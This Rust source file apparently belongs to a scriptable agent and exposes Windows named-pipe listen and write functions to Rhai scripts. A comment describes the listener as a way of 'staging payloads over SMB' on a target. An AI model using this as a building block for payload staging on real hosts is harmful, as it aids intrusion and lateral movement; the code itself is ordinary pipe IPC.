// src/agent/scripting/pipes.rs
use rhai::Engine;

pub fn register(engine: &mut Engine) {

    // Create a server-side named pipe, block until one client connects,
    // read up to 64 KB, and return the data as hex.
    // Use for staging payloads over SMB (\\target\pipe\name).
    // Windows only — returns descriptive error on other platforms.
    engine.register_fn("internal_named_pipe_listen", |name: &str, timeout_ms: i64| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let pipe_name = format!(
                "\\\\.\\pipe\\{}",
                name.trim_start_matches("\\\\.\\pipe\\"),
            );
            let cname = match CString::new(pipe_name.as_bytes()) {
                Ok(s)  => s,
                Err(_) => return "Error: invalid pipe name".into(),
            };
            unsafe {
                use super::win_ffi::win_ext::*;
                let h = CreateNamedPipeA(
                    cname.as_ptr(),
                    PIPE_ACCESS_DUPLEX,
                    PIPE_TYPE_BYTE,
                    PIPE_UNLIMITED_INSTANCES,
                    65536, 65536,
                    timeout_ms.max(0) as DWORD,
                    std::ptr::null_mut(),
                );
                if h == INVALID_HANDLE_VALUE {
                    return format!("Error: CreateNamedPipe failed ({})", GetLastError());
                }
                ConnectNamedPipe(h, std::ptr::null_mut());
                let mut buf  = vec![0u8; 65536];
                let mut read: DWORD = 0;
                let ok = ReadFile(
                    h, buf.as_mut_ptr() as _, buf.len() as DWORD,
                    &mut read, std::ptr::null_mut(),
                );
                DisconnectNamedPipe(h);
                CloseHandle(h);
                if ok != 0 { hex::encode(&buf[..read as usize]) }
                else { format!("Error: ReadFile failed ({})", GetLastError()) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        format!("Error: named_pipe_listen is Windows only ({})", name)
    });

    // Connect to an existing named pipe as a client and write hex-encoded data.
    // Windows only — returns descriptive error on other platforms.
    engine.register_fn("internal_named_pipe_write", |name: &str, data_hex: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let data = match hex::decode(data_hex) {
                Ok(d)  => d,
                Err(_) => data_hex.as_bytes().to_vec(),
            };
            let pipe_name = format!(
                "\\\\.\\pipe\\{}",
                name.trim_start_matches("\\\\.\\pipe\\"),
            );
            let cname = match CString::new(pipe_name.as_bytes()) {
                Ok(s)  => s,
                Err(_) => return "Error: invalid pipe name".into(),
            };
            unsafe {
                use super::win_ffi::win_ext::*;
                let h = CreateFileA(
                    cname.as_ptr(), GENERIC_WRITE, 0,
                    std::ptr::null_mut(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
                    std::ptr::null_mut(),
                );
                if h == INVALID_HANDLE_VALUE {
                    return format!("Error: CreateFile failed ({})", GetLastError());
                }
                let mut written: DWORD = 0;
                let ok = WriteFile(
                    h, data.as_ptr() as _, data.len() as DWORD,
                    &mut written, std::ptr::null_mut(),
                );
                CloseHandle(h);
                if ok != 0 { format!("Wrote {} bytes", written) }
                else { format!("Error: WriteFile failed ({})", GetLastError()) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        format!("Error: named_pipe_write is Windows only ({})", name)
    });
}
